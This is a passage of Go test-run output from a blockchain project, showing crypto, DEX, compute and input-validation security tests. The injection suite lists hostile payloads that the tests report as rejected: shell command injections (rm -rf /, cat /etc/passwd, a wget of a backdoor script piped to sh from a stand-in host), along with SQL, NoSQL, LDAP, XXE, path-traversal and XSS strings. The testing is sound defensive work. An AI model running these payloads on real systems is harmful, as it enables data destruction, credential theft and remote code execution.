+        --- PASS: TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation/Third_address (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation/High_index (0.00s)
+    --- PASS: TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics (0.02s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x00 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x01 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x02 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x03 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x04 (0.00s)
+    --- PASS: TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration (0.02s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy_\u0080 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy__ (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy_À (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy_à (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy_Ā (0.00s)
+    --- PASS: TestCryptoSecurityTestSuite/TestCryptographicPrimitives_Standards (0.01s)
+    --- PASS: TestCryptoSecurityTestSuite/TestEntropy_Randomness (0.02s)
+    --- PASS: TestCryptoSecurityTestSuite/TestHashCollision_Resistance (0.04s)
+    --- PASS: TestCryptoSecurityTestSuite/TestKeyGeneration_Secp256k1 (0.02s)
+    --- PASS: TestCryptoSecurityTestSuite/TestKeyRecovery_Prevention (0.04s)
+    --- PASS: TestCryptoSecurityTestSuite/TestNonceReuse_Prevention (0.02s)
+    --- PASS: TestCryptoSecurityTestSuite/TestSignature_Verification (0.02s)
+        --- PASS: TestCryptoSecurityTestSuite/TestSignature_Verification/Short_message (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestSignature_Verification/Medium_message (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestSignature_Verification/Long_message (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestSignature_Verification/Empty_message (0.00s)
+    --- PASS: TestCryptoSecurityTestSuite/TestTimingAttack_Resistance (0.39s)
+    --- PASS: TestCryptoSecurityTestSuite/TestWeakKeys_Detection (0.02s)
+        --- PASS: TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x00 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x01 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x02 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x03 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x04 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x05 (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x06 (0.00s)
+=== RUN   TestInjectionSecurityTestSuite
+=== RUN   TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs
+=== RUN   TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_1KB
+=== RUN   TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_10KB
+=== RUN   TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_100KB
+=== RUN   TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_1MB
+=== RUN   TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint
+=== RUN   TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com;_rm_-rf_/
+    injection_test.go:92: Payload correctly rejected: https://api.com; rm -rf /
+=== RUN   TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com_|_cat_/etc/passwd
+    injection_test.go:92: Payload correctly rejected: https://api.com | cat /etc/passwd
+=== RUN   TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com_&&_curl_malicious.com
+    injection_test.go:92: Payload correctly rejected: https://api.com && curl malicious.com
+=== RUN   TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com`whoami`
+    injection_test.go:92: Payload correctly rejected: https://api.com`whoami`
+=== RUN   TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com$(ls_-la)
+    injection_test.go:92: Payload correctly rejected: https://api.com$(ls -la)
+=== RUN   TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com;_wget_malicious.com/backdoor.sh_|_sh
+    injection_test.go:92: Payload correctly rejected: https://api.com; wget malicious.com/backdoor.sh | sh
+=== RUN   TestInjectionSecurityTestSuite/TestFormatString_Injection
+=== RUN   TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%s%s%s%s%s
+=== RUN   TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%x%x%x%x%x
+=== RUN   TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%n%n%n%n%n
+=== RUN   TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%.1000000000f
+=== RUN   TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%p%p%p%p
+=== RUN   TestInjectionSecurityTestSuite/TestIntegerOverflow_Amounts
+=== RUN   TestInjectionSecurityTestSuite/TestIntegerOverflow_Amounts/Integer_overflow_MaxInt64
+=== RUN   TestInjectionSecurityTestSuite/TestIntegerOverflow_Amounts/Integer_overflow_Near_overflow
+=== RUN   TestInjectionSecurityTestSuite/TestLDAP_Injection
+=== RUN   TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_*
+    injection_test.go:395: Endpoint accepted: https://api.com/user=*
+=== RUN   TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_admin*
+    injection_test.go:395: Endpoint accepted: https://api.com/user=admin*
+=== RUN   TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_*)(&
+=== RUN   TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_*)(uid=*))(|(uid=*
+=== RUN   TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_admin)(&(password=*))
+=== RUN   TestInjectionSecurityTestSuite/TestNoSQL_Injection
+=== RUN   TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$gt:_''}
+=== RUN   TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$ne:_null}
+=== RUN   TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_';_return_true;_var_dummy='
+=== RUN   TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$where:_'return_true'}
+=== RUN   TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_admin'_||_'1'=='1
+=== RUN   TestInjectionSecurityTestSuite/TestNullByte_Injection
+=== RUN   TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_upaw\x00.txt
+=== RUN   TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_token\x00admin
+=== RUN   TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_asset\x00'_OR_'1'='1
+=== RUN   TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints
+=== RUN   TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_../../../etc/passwd
+=== RUN   TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_..\..\..\windows\system32
+=== RUN   TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/../../secrets
+=== RUN   TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/%2e%2e%2f%2e%2e%2f
+=== RUN   TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/....//....//
+=== RUN   TestInjectionSecurityTestSuite/TestRegex_Denial
+=== RUN   TestInjectionSecurityTestSuite/TestRegex_Denial/ReDoS_\x00
+    injection_test.go:362: Validation completed successfully
+=== RUN   TestInjectionSecurityTestSuite/TestRegex_Denial/ReDoS_\x01
+    injection_test.go:362: Validation completed successfully
+=== RUN   TestInjectionSecurityTestSuite/TestRegex_Denial/ReDoS_\x02
+    injection_test.go:362: Validation completed successfully
+=== RUN   TestInjectionSecurityTestSuite/TestSQLInjection_TokenName
+=== RUN   TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_';_DROP_TABLE_pools;_--
+=== RUN   TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_1'_OR_'1'='1
+=== RUN   TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_admin'--
+=== RUN   TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_'_OR_1=1--
+=== RUN   TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_';_DELETE_FROM_pools_WHERE_'1'='1
+=== RUN   TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_token';_UPDATE_pools_SET_reserve_a=0;_--
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token_
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token_#01
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token_#02
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token<
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token>
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token&
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token'
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token"
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token`
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token|
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token;
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token:
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token{
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token}
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token[
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token]
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token(
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token)
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token*
+=== RUN   TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token?
+=== RUN   TestInjectionSecurityTestSuite/TestUnicode_Normalization
+=== RUN   TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_upaẁ
+=== RUN   TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_ｕｐａｗ
+=== RUN   TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_upaw\u200b
+=== RUN   TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_upaw\u202e
+=== RUN   TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_upaw
+    injection_test.go:324: Unicode payload accepted (may be normalized): upaw
+=== RUN   TestInjectionSecurityTestSuite/TestXML_Injection
+=== RUN   TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<?xml_version="1.0"?><!DOCTYPE_foo_[<!ENTITY_xxe_SYSTEM_"file:///etc/passwd">]>
+=== RUN   TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<user><name>admin</name></user>
+=== RUN   TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_&xxe;
+=== RUN   TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<!ENTITY_test_SYSTEM_"file:///">
+=== RUN   TestInjectionSecurityTestSuite/TestXSS_AssetNames
+=== RUN   TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<script>alert('XSS')</script>
+=== RUN   TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<img_src=x_onerror=alert('XSS')>
+=== RUN   TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_javascript:alert('XSS')
+=== RUN   TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<iframe_src='javascript:alert(1)'>
+=== RUN   TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<svg/onload=alert('XSS')>
+=== RUN   TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_';alert(String.fromCharCode(88,83,83))//
+--- PASS: TestInjectionSecurityTestSuite (0.18s)
+    --- PASS: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_1KB (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_10KB (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_100KB (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestBufferOverflow_LongInputs/Buffer_overflow_1MB (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint (0.02s)
+        --- PASS: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com;_rm_-rf_/ (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com_|_cat_/etc/passwd (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com_&&_curl_malicious.com (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com`whoami` (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com$(ls_-la) (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestCommandInjection_ComputeEndpoint/Command_injection_https://api.com;_wget_malicious.com/backdoor.sh_|_sh (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestFormatString_Injection (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%s%s%s%s%s (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%x%x%x%x%x (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%n%n%n%n%n (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%.1000000000f (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestFormatString_Injection/Format_string_%p%p%p%p (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestIntegerOverflow_Amounts (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestIntegerOverflow_Amounts/Integer_overflow_MaxInt64 (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestIntegerOverflow_Amounts/Integer_overflow_Near_overflow (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestLDAP_Injection (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_* (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_admin* (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_*)(& (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_*)(uid=*))(|(uid=* (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestLDAP_Injection/LDAP_injection_admin)(&(password=*)) (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestNoSQL_Injection (0.02s)
+        --- PASS: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$gt:_''} (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$ne:_null} (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_';_return_true;_var_dummy=' (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_{$where:_'return_true'} (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestNoSQL_Injection/NoSQL_injection_admin'_||_'1'=='1 (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestNullByte_Injection (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_upaw\x00.txt (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_token\x00admin (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestNullByte_Injection/Null_byte_asset\x00'_OR_'1'='1 (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_../../../etc/passwd (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_..\..\..\windows\system32 (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/../../secrets (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/%2e%2e%2f%2e%2e%2f (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestPathTraversal_Endpoints/Path_traversal_https://api.com/....//....// (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestRegex_Denial (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestRegex_Denial/ReDoS_\x00 (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestRegex_Denial/ReDoS_\x01 (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestRegex_Denial/ReDoS_\x02 (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_';_DROP_TABLE_pools;_-- (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_1'_OR_'1'='1 (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_admin'-- (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_'_OR_1=1-- (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_';_DELETE_FROM_pools_WHERE_'1'='1 (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSQLInjection_TokenName/SQL_injection_token';_UPDATE_pools_SET_reserve_a=0;_-- (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token_ (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token_#01 (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token_#02 (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token< (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token> (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token& (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token' (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token" (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token` (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token| (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token; (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token: (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token{ (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token} (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token[ (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token] (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token( (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token) (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token* (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestSpecialCharacters_Validation/Special_char_token? (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestUnicode_Normalization (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_upaẁ (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_ｕｐａｗ (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_upaw\u200b (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_upaw\u202e (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestUnicode_Normalization/Unicode_normalization_upaw (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestXML_Injection (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<?xml_version="1.0"?><!DOCTYPE_foo_[<!ENTITY_xxe_SYSTEM_"file:///etc/passwd">]> (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<user><name>admin</name></user> (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_&xxe; (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXML_Injection/XML_injection_<!ENTITY_test_SYSTEM_"file:///"> (0.00s)
+    --- PASS: TestInjectionSecurityTestSuite/TestXSS_AssetNames (0.01s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<script>alert('XSS')</script> (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<img_src=x_onerror=alert('XSS')> (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_javascript:alert('XSS') (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<iframe_src='javascript:alert(1)'> (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_<svg/onload=alert('XSS')> (0.00s)
+        --- PASS: TestInjectionSecurityTestSuite/TestXSS_AssetNames/XSS_';alert(String.fromCharCode(88,83,83))// (0.00s)
+PASS
+ok  	github.com/paw-chain/paw/tests/security	(cached)
+?   	github.com/paw-chain/paw/testutil/cometmock	[no test files]
+?   	github.com/paw-chain/paw/testutil/integration	[no test files]
+?   	github.com/paw-chain/paw/testutil/keeper	[no test files]
+?   	github.com/paw-chain/paw/x/compute	[no test files]
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+=== RUN   TestKeeperTestSuite
+--- PASS: TestKeeperTestSuite (0.00s)
+=== RUN   TestRegisterProvider
+    keeper_test.go:33: TODO: Implement RegisterProvider method in compute keeper
+--- SKIP: TestRegisterProvider (0.00s)
+=== RUN   TestRequestCompute
+=== RUN   TestRequestCompute/valid_compute_request
+=== RUN   TestRequestCompute/empty_API_URL
+=== RUN   TestRequestCompute/zero_max_fee
+--- PASS: TestRequestCompute (0.01s)
+    --- PASS: TestRequestCompute/valid_compute_request (0.00s)
+    --- PASS: TestRequestCompute/empty_API_URL (0.00s)
+    --- PASS: TestRequestCompute/zero_max_fee (0.00s)
+=== RUN   TestSubmitResult
+=== RUN   TestSubmitResult/valid_result_submission
+=== RUN   TestSubmitResult/invalid_request_ID
+--- PASS: TestSubmitResult (0.00s)
+    --- PASS: TestSubmitResult/valid_result_submission (0.00s)
+    --- PASS: TestSubmitResult/invalid_request_ID (0.00s)
+PASS
+ok  	github.com/paw-chain/paw/x/compute/keeper	(cached)
+?   	github.com/paw-chain/paw/x/compute/types	[no test files]
+?   	github.com/paw-chain/paw/x/dex	[no test files]
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+=== RUN   TestCircuitBreakerConfig
+--- PASS: TestCircuitBreakerConfig (0.00s)
+=== RUN   TestCircuitBreakerValidation
+=== RUN   TestCircuitBreakerValidation/valid_config
+=== RUN   TestCircuitBreakerValidation/negative_threshold
+=== RUN   TestCircuitBreakerValidation/thresholds_not_in_ascending_order
+=== RUN   TestCircuitBreakerValidation/negative_cooldown_period
+=== RUN   TestCircuitBreakerValidation/invalid_resume_volume_factor
+--- PASS: TestCircuitBreakerValidation (0.00s)
+    --- PASS: TestCircuitBreakerValidation/valid_config (0.00s)
+    --- PASS: TestCircuitBreakerValidation/negative_threshold (0.00s)
+    --- PASS: TestCircuitBreakerValidation/thresholds_not_in_ascending_order (0.00s)
+    --- PASS: TestCircuitBreakerValidation/negative_cooldown_period (0.00s)
+    --- PASS: TestCircuitBreakerValidation/invalid_resume_volume_factor (0.00s)
+=== RUN   TestCircuitBreakerTrip
+--- PASS: TestCircuitBreakerTrip (0.00s)
+=== RUN   TestCircuitBreakerResume
+--- PASS: TestCircuitBreakerResume (0.00s)
+=== RUN   TestCircuitBreakerAutomaticResume
+--- PASS: TestCircuitBreakerAutomaticResume (0.00s)
+=== RUN   TestPriceVolatilityDetection
+--- PASS: TestPriceVolatilityDetection (0.01s)
+=== RUN   TestSwapVolumeLimit
+--- PASS: TestSwapVolumeLimit (0.00s)
+=== RUN   TestCheckCircuitBreakerInSwap
+--- PASS: TestCheckCircuitBreakerInSwap (0.00s)
+=== RUN   TestGetAllCircuitBreakerStates
+--- PASS: TestGetAllCircuitBreakerStates (0.00s)
+=== RUN   TestKeeperTestSuite
+--- PASS: TestKeeperTestSuite (0.00s)
+=== RUN   TestCreatePool
+=== RUN   TestCreatePool/valid_pool_creation
+=== RUN   TestCreatePool/same_token_pool
+=== RUN   TestCreatePool/zero_amount
+--- PASS: TestCreatePool (0.00s)
+    --- PASS: TestCreatePool/valid_pool_creation (0.00s)
+    --- PASS: TestCreatePool/same_token_pool (0.00s)
+    --- PASS: TestCreatePool/zero_amount (0.00s)
+=== RUN   TestSwap
+    dex.go:110: CreatePool message handler not implemented yet
+--- SKIP: TestSwap (0.00s)
+=== RUN   TestAddLiquidity
+    dex.go:110: CreatePool message handler not implemented yet
+--- SKIP: TestAddLiquidity (0.00s)
+=== RUN   TestRemoveLiquidity
+    dex.go:110: CreatePool message handler not implemented yet
+--- SKIP: TestRemoveLiquidity (0.00s)
+PASS
+ok  	github.com/paw-chain/paw/x/dex/keeper	(cached)
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+=== RUN   TestMsgCreatePool_ValidateBasic
+=== RUN   TestMsgCreatePool_ValidateBasic/valid_message
+=== RUN   TestMsgCreatePool_ValidateBasic/invalid_creator_address
+=== RUN   TestMsgCreatePool_ValidateBasic/empty_token_A
+=== RUN   TestMsgCreatePool_ValidateBasic/empty_token_B
+=== RUN   TestMsgCreatePool_ValidateBasic/same_tokens
+=== RUN   TestMsgCreatePool_ValidateBasic/zero_amount_A
+=== RUN   TestMsgCreatePool_ValidateBasic/negative_amount_B
+--- PASS: TestMsgCreatePool_ValidateBasic (0.01s)
+    --- PASS: TestMsgCreatePool_ValidateBasic/valid_message (0.00s)
+    --- PASS: TestMsgCreatePool_ValidateBasic/invalid_creator_address (0.00s)
+    --- PASS: TestMsgCreatePool_ValidateBasic/empty_token_A (0.00s)
+    --- PASS: TestMsgCreatePool_ValidateBasic/empty_token_B (0.00s)
+    --- PASS: TestMsgCreatePool_ValidateBasic/same_tokens (0.00s)
+    --- PASS: TestMsgCreatePool_ValidateBasic/zero_amount_A (0.00s)
+    --- PASS: TestMsgCreatePool_ValidateBasic/negative_amount_B (0.00s)
+=== RUN   TestMsgSwap_ValidateBasic
+=== RUN   TestMsgSwap_ValidateBasic/valid_swap
+=== RUN   TestMsgSwap_ValidateBasic/invalid_trader_address
+=== RUN   TestMsgSwap_ValidateBasic/zero_pool_id
